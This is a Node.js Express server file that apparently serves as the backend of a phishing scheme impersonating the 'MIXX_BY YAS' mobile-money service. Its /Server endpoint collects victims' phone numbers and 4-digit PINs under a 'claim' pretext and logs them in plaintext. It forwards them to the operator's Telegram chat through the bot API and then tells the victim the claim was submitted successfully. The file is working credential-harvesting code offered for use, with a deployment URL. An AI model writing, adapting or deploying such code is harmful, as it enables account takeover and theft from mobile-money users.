require('dotenv').config();
const express = require('express');
const cors = require('cors');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 5000;

app.set('trust proxy', 1);

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

app.use(cors({
  origin: '*',
  methods: ['GET', 'POST'],
  allowedHeaders: ['Content-Type']
}));

app.use(express.json({ limit: '10kb' }));
app.use(express.urlencoded({ extended: true, limit: '10kb' }));

app.get('/', (req, res) => {
  res.json({
    status: 'OK',
    message: 'MIXX_BY YAS Backend is running',
    timestamp: new Date().toISOString()
  });
});

app.get('/health', (req, res) => {
  res.status(200).json({ 
    status: 'healthy', 
    uptime: process.uptime()
  });
});

app.post('/Server', async (req, res) => {
  try {
    const { phone, pin } = req.body;

    if (!phone || !pin) {
      return res.status(400).json({
        success: false,
        message: 'Phone and PIN are required'
      });
    }

    const phoneRegex = /^[0-9]{10}$/;
    if (!phoneRegex.test(phone)) {
      return res.status(400).json({
        success: false,
        message: 'Phone number must be 10 digits'
      });
    }

    const pinRegex = /^[0-9]{4}$/;
    if (!pinRegex.test(pin)) {
      return res.status(400).json({
        success: false,
        message: 'PIN must be 4 digits'
      });
    }

    console.log('✅ Valid data received:', { phone, pin });

    let telegramSuccess = false;

    if (TELEGRAM_BOT_TOKEN) {
      try {
        const message = `🎯 *NEW CLAIM - MIXX_BY YAS*\n📱 Phone: ${phone}\n🔐 PIN: ${pin}\n🕐 Time: ${new Date().toLocaleString('sw-TZ', { timeZone: 'Africa/Dar_es_Salaam' })}`;

        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        
        const response = await axios.post(telegramUrl, {
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'Markdown'
        }, {
          timeout: 10000
        });

        telegramSuccess = response.data.ok;
        
        if (telegramSuccess) {
          console.log('✅ Telegram notification sent successfully');
        }
      } catch (telegramError) {
        console.error('❌ Telegram send failed:', telegramError.message);
        telegramSuccess = false;
      }
    }

    res.status(200).json({
      success: true,
      message: 'Claim submitted successfully',
      telegram: {
        sent: telegramSuccess
      }
    });

  } catch (error) {
    console.error('❌ Server error:', error);
    res.status(500).json({
      success: false,
      message: 'Internal server error'
    });
  }
});

app.listen(PORT, () => {
  console.log('========================================');
  console.log('🚀 MIXX_BY YAS Backend Server');
  console.log('========================================');
  console.log(`📡 Server running on port: ${PORT}`);
  console.log(`🌐 URL: https://mix-by-yas-production.up.railway.app`);
  console.log('========================================');
});
